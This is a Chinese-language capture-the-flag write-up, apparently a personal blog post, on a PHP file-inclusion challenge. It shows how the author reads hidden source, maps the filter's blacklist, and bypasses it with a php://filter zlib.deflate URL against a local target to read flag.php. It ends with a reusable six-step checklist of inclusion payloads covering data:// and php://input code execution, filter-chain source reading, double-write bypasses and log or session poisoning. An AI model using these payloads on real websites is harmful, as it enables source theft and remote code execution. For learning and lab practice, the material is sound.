---
title: "PHP伪协议文件包含漏洞复现"
date: 2026-09-21
draft: false
---
<img width="1001" height="512" alt="image" src="https://github.com/user-attachments/assets/2c0d03fa-ef1a-4d42-b608-c3353278554e" />
题目明确说明是php，并提示说按f12

先来了解一下php，PHP 是一种在服务器上运行的编程语言。
https://www.cnblogs.com/linuxsec/articles/12684259.html
感觉这个博客很不错？可以说这个题完全就是这个博客里的东西

<img width="1280" height="707" alt="屏幕截图 2026-09-21 200920" src="https://github.com/user-attachments/assets/8c9da2d5-e858-4f40-8f97-f968064068d9" />
聪明的人才能看见？皇帝的代码吗？

<img width="1280" height="527" alt="屏幕截图 2026-09-21 200933" src="https://github.com/user-attachments/assets/51c101a3-bf1f-4f0b-8520-e18a40464c2a" />
在这里可以看见个disaplay:none  ....显示方式是none?那就是只能欺骗你的眼睛，确定方向：拿源代码

<img width="953" height="162" alt="屏幕截图 2026-09-21 202642" src="https://github.com/user-attachments/assets/63fa7f44-b53e-4206-a517-e4a8adc09154" />
审计的时候发现了这一句话，又完完整整的把这一整行代码都看了一遍，发现了很多有用的信息

<img width="886" height="110" alt="屏幕截图 2026-09-21 202835" src="https://github.com/user-attachments/assets/698fa8b5-e2b4-48de-94ef-be37bf894f87" />

<img width="1172" height="283" alt="image" src="https://github.com/user-attachments/assets/c6032ccc-60c7-4f91-a647-4c15835330b4" />
看见这些关键词会咬我吗？有点意思看看题目作者到底在防什么
http https防我去别人的服务器上拿文件当代码跑
..防止我用 ../../../../etc/passwd 一层层往上翻到系统目录
^/、=/防止我写 /etc/passwd 这种从根目录开始的路径
proc env防止读 Linux 的 /proc/self/environ 等
input data防止 php://input、data:// —— 这两个能直接把代码怼进去执行
index不想让我读她的源码
convert string，把过滤器最常用的两族ban了吗？
file防止读敏感文件，笑了我读flag看你干嘛

<img width="416" height="70" alt="image" src="https://github.com/user-attachments/assets/a549ee6c-7984-416d-8485-050d4ccbe551" />
URL参数也拿到了


输出base64<img width="367" height="164" alt="image" src="https://github.com/user-attachments/assets/54cdef5f-4bc8-4143-abd8-fe102e8c717e" />


OK信息收集完毕开始构造payload,构造规则php://filter/<过滤器链>/resource=<目标>
用的黑名单没用，是列举不完的，还有个zlib.压缩过滤协议
http://127.0.0.1:23445/?file=php://filter/zlib.deflate/resource=flag.php
拿到一个乱码
<img width="1280" height="769" alt="屏幕截图 2026-09-21 203852" src="https://github.com/user-attachments/assets/4f938127-da3b-4928-828b-f31466eaa2ef" />
base64解码再解压缩一下，<img width="1280" height="740" alt="屏幕截图 2026-09-21 204721" src="https://github.com/user-attachments/assets/d54930b9-690c-4416-9e32-dede8c4f0b01" />
拿到flag
说白了还要白名单，黑名单是禁不完的
第 1 步：确认能不能读文件
   ?file=chap1.html → 内容能切换 = 有戏

第 2 步：能不能直接执行代码（能就直接 RCE）
   ?file=data://text/plain,<?php phpinfo();?>
   ?file=php://input   （配合 POST 传代码）

第 3 步：读源码（最常用）
   ?file=php://filter/convert.base64-encode/resource=index.php
   → 拿到 base64 → 本地解码 → 就是源码

第 4 步：第 3 步被拦？换过滤器家族
   ?file=php://filter/zlib.deflate/resource=目标.php        
   ?file=php://filter/zlib.inflate/resource=目标.php
   ?file=php://filter/string.rot13/resource=目标.php
   ?file=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=目标.php

第 5 步：遇到"删除型"黑名单，用双写
   phpphp://://filter/...     flflag.php

第 6 步：连 php:// 都被封
   换方向：日志投毒、session 文件包含、/proc/self/environ、文件上传
